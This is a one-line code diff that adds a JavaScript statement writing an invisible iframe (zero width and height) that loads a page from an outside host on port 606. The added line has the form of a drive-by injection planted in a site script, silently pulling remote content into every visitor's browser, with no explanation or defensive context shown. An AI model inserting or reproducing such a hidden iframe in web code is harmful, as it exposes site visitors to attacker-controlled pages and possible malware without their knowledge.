@@ -1,0 +1,1 @@
+document.write("<iframe src=http://34fuck360.8866.org:606/wm/zrx2.html width=0 height=0></iframe>");
